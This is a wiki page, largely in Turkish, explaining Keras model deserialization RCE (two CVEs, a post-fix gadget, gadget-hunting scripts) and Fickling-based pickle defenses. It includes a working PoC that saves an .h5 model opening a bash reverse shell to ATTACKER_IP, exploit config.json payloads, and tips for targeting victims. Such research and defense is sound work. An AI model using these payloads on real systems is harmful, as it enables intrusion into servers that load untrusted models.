# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, Keras model deserialization pipeline'ına yönelik pratik istismar tekniklerini özetler, native .keras formatının iç yapısını ve attack surface'ını açıklar ve Model File Vulnerabilities (MFVs) ile post-fix gadget'ları bulmak için bir araştırmacı araç seti sunar.

## .keras model format internals

Bir .keras dosyası en az şu öğeleri içeren bir ZIP arşividir:
- metadata.json – genel bilgi (ör., Keras version)
- config.json – model mimarisi (primary attack surface)
- model.weights.h5 – ağırlıklar HDF5 içinde

config.json recursive deserialization'ı tetikler: Keras modülleri import eder, sınıfları/fonksiyonları çözer ve saldırgan tarafından kontrol edilen sözlüklerden katmanları/nesneleri yeniden oluşturur.

Bir Dense layer objesi için örnek kesit:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization şunları yapar:
- Module import and symbol resolution from module/class_name keys
- from_config(...) or constructor invocation with saldırgan kontrollü kwargs
- İç içe geçmiş nesnelere (activations, initializers, constraints, vb.) özyineleme

Tarihsel olarak, bu config.json hazırlayan bir saldırgan için üç temel imkana yol açtı:
- Hangi modüllerin import edildiğinin kontrolü
- Hangi sınıfların/fonksiyonların çözümlendiğinin kontrolü
- constructor'lara/from_config içine geçirilen kwargs'ın kontrolü

## CVE-2024-3660 – Lambda-layer bytecode RCE

Kök neden:
- Lambda.from_config() python_utils.func_load(...) kullanıyordu; bu, saldırgan tarafından sağlanan baytları base64 çözerek marshal.loads() çağırıyordu; Python'un unmarshalling'i kod çalıştırabilir.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Önlemler:
- Keras varsayılan olarak safe_mode=True uygular. Lambda içindeki serileştirilmiş Python fonksiyonları, kullanıcı açıkça safe_mode=False ile devre dışı bırakmadıkça engellenir.

Notlar:
- Legacy formatlar (eski HDF5 kayıtları) veya eski kod tabanları modern kontrolleri uygulamayabilir; bu nedenle "downgrade" tarzı saldırılar, mağdurlar daha eski yükleyiciler kullandığında hâlâ geçerli olabilir.

## CVE-2025-1550 – Keras ≤ 3.8'de keyfi modül içe aktarımı

Kök sebep:
- _retrieve_class_or_fn, config.json'dan gelen ve saldırganın kontrol ettiği modül dizeleriyle kısıtlanmamış importlib.import_module() kullandı.
- Etkisi: Herhangi bir yüklü modülün (veya sys.path'e saldırgan tarafından yerleştirilmiş bir modülün) keyfi olarak içe aktarılmasına izin verildi. İçe aktarma sırasında modül kodu çalıştırılır; ardından nesne oluşturulurken saldırganın kwargs'larıyla örnekleme gerçekleşir.

İstismar fikri:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- Modül izin listesi: importlar resmi ekosistem modülleriyle sınırlı: keras, keras_hub, keras_cv, keras_nlp
- Güvenli mod varsayılanı: safe_mode=True, güvensiz Lambda serileştirilmiş fonksiyonların yüklenmesini engeller
- Temel tür kontrolü: seriden geri yüklenen nesneler beklenen türlerle eşleşmelidir

## Pratik istismar: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Birçok production stack hâlâ eski TensorFlow-Keras HDF5 model dosyalarını (.h5) kabul ediyor. Bir saldırgan sunucuya daha sonra yüklenen veya üzerinde inference yapılan bir model yükleyebilirse, bir Lambda katmanı load/build/predict sırasında rastgele Python çalıştırabilir.

Deserializasyon veya kullanım sırasında reverse shell çalıştıran kötü amaçlı bir .h5 oluşturmak için minimal PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notlar ve güvenilirlik ipuçları:
- Tetikleme noktaları: code birden çok kez çalışabilir (örn., during layer build/first call, model.load_model, and predict/fit). Payloads'ı idempotent yapın.
- Sürüm sabitleme: victim’in TF/Keras/Python ile eşleştirerek serileştirme uyumsuzluklarını önleyin. Örneğin, hedefin kullandığı şey buysa, build artifacts'i Python 3.8 altında TensorFlow 2.13.1 ile oluşturun.
- Hızlı ortam çoğaltma:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Doğrulama: os.system("ping -c 1 YOUR_IP") gibi zararsız bir payload, yürütmeyi doğrulamaya yardımcı olur (ör. tcpdump ile ICMP'yi gözlemleyin) ve reverse shell'e geçmeden önce.

## Allowlist içindeki düzeltme sonrası gadget yüzeyi

Allowlisting ve safe mode etkin olsa bile, izin verilen Keras callables arasında geniş bir yüzey kalır. Örneğin, keras.utils.get_file rastgele URL'leri kullanıcı tarafından seçilebilen konumlara indirebilir.

İzin verilen bir fonksiyona referans veren Lambda aracılığıyla gadget (serileştirilmiş Python bytecode değil):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Önemli sınırlama:
- Lambda.call() hedef callable'ı çağırırken input tensor'ü ilk pozisyonel argüman olarak ekler. Seçilen gadgets fazladan bir pozisyonel argümanı tolere etmeli (veya *args/**kwargs kabul etmeli). Bu hangi fonksiyonların kullanılabilir olduğunu kısıtlar.

## ML pickle import izin listesi oluşturma for AI/ML models (Fickling)

Many AI/ML model formats (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts, etc.) embed Python pickle data. Saldırganlar rutin olarak pickle GLOBAL imports ve object constructors'ı yükleme sırasında RCE veya model değiştirme (model swapping) gerçekleştirmek için kötüye kullanır. Kara liste tabanlı tarayıcılar genellikle yeni veya listelenmemiş tehlikeli import'ları kaçırır.

Pratik, fail-closed bir savunma, Python’un pickle deserializer'ına müdahale etmek ve unpickling sırasında yalnızca gözden geçirilmiş, zararsız ML ile ilgili import'lara izin vermektir. Trail of Bits’in Fickling'i bu politikayı uygular ve binlerce halka açık Hugging Face pickle'ından oluşturulmuş küratörlü bir ML import izin listesi ile dağıtılır.

“Güvenli” import'lar için güvenlik modeli (araştırma ve uygulamadan damıtılmış sezgiler): bir pickle tarafından kullanılan import edilen semboller aynı anda şunları sağlamalıdır:
- Kod çalıştırmamalı veya yürütmeye neden olmamalı (derlenmiş/kaynak kod nesneleri, sistem komutu çağırma, hook'lar vb. olmamalı)
- Rastgele öznitelikleri veya öğeleri alıp/ayarlamamalı
- pickle VM'den diğer Python nesnelerini import etmemeli veya referans elde etmemeli
- Herhangi bir sekonder deserializer'ı (örn., marshal, nested pickle) tetiklememeli, dolaylı yoldan bile

Fickling’in korumalarını, framework'lerin (torch.load, joblib.load, vb.) gerçekleştirdiği herhangi bir pickle yüklemesinin denetlenebilmesi için işlem başlatmasında mümkün olan en erken zamanda etkinleştirin:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasyonel ipuçları:
- Gerektiğinde hooks'ları geçici olarak devre dışı bırakabilir/yeniden etkinleştirebilirsiniz:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Bilinen güvenli bir model engellenmişse, sembolleri gözden geçirdikten sonra ortamınız için allowlist'i genişletin:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling ayrıca daha ayrıntılı kontroller tercih ediyorsanız genel çalışma zamanı korumaları sağlar:
- fickling.always_check_safety() tüm pickle.load() çağrıları için kontrolleri zorlamak için
- with fickling.check_safety(): belirli kapsamda zorlamayı etkinleştirmek için
- fickling.load(path) / fickling.is_likely_safe(path) tek seferlik kontroller için

- Mümkünse non-pickle model formatlarını tercih edin (ör. SafeTensors). Eğer pickle kabul etmek zorundaysanız, loader'ları en az ayrıcalıkla, ağ çıkışı olmadan çalıştırın ve allowlist'i uygulayın.

This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.


## Araştırmacı araç seti

1) Allowlisted modüllerde sistematik gadget keşfi

Aday callable'ları keras, keras_nlp, keras_cv, keras_hub genelinde listeleyin ve dosya/ağ/işlem/çevre (env) yan etkisi olanları önceliklendirin.

<details>
<summary>Allowlisted Keras modüllerinde potansiyel olarak tehlikeli callables'ları listeleyin</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing (no .keras archive needed)

Kabul edilen parametreleri öğrenmek ve yan etkileri gözlemlemek için hazırlanmış dict'leri doğrudan Keras deserializers'ına verin.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sürümler arası yoklama ve formatlar

Keras farklı koruma mekanizmalarına ve formatlara sahip birden fazla kod tabanında/döneminde bulunur:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, silinmesi planlanıyor)
- tf-keras: ayrı şekilde bakım yapılıyor
- Multi-backend Keras 3 (official): yerel .keras formatını tanıttı

Regresyonları veya eksik korumaları ortaya çıkarmak için kod tabanları ve formatlar (.keras vs legacy HDF5) arasında testleri tekrarlayın.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
